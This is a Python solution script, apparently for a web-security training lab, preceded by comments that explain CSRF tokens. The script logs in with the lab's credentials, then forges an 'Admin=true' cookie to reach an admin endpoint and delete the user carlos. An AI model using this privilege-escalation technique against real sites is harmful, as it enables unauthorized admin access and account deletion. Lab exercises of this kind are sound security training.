# User role controlled by request parameter
# Write your code here

# User rol controled by request parameter
# Target Goal - Access admin panel and use it to delete the user carlos
# creds: wiener:peter

#---------------------------knowledge-------------------------------------
#  csrf (Cross-Site Request Forgery) token is a security measure used to 
# protect web application from CSRF Attack. CSRF attacks occur when a 
# malicious website tricks a user's browser into making unintended 
# requests to a diffrent website where the user is authenticated. These
#  requests can perform actions on behalf of the user without their consent.

# A CSRF token is a unique, random value generated by the server and embedded 
# within web forms or HTTP requests. When a form is submitted or a request 
# is made, the server checks if the CSRF token matches the expected value. If
# it does nont match or is missing, the request is typically rejected, thus 
# preventing unauthorized actions.

# By including a CSRF token in requests, web applications can ensure that 
# the request originates from a legitimate source and has not been tampered 
# with by malicious actors. This helps to mitigate the risk of the CSRF 
# attacks and protect user data and accounts.

# -------------------------------------------------------------------------

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https:127.0.0.1:8080'}
proxies = {'http': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    
    return csrf

def delete_user(s, url):
    # delete user logic
    # get CSRF token from the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # login as the wiener:peter user
    data = {"csrf": csrf_token,
            "username": "wiener",
            "password": "peter"}
    
    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text

    if "Log out" in res:
        print("(+) Succesffully logged in as the wiener user.")

        # Retrieve session cookie
        session_cookie = r.cookies.get_dict().get('session')

        # Visit the admin panel and delete the user carlos
        delete_carlos_user_url = url + "/admin/delete?username=carlos"
        cookies = {'session': session_cookie, "Admin": "true"}
        r = requests.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)
        if r.status_code == 200:
            print('(+) Succesfully deleted Carlos user.')
        else:
            print('(-) Failed to delete Carlos user')
            sys.exit(-1)

    else:
        print("(-) Failed to login as the wiener user.")
        sys.exit(-1)
    


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)

if __name__ == "__main__":
    main()
    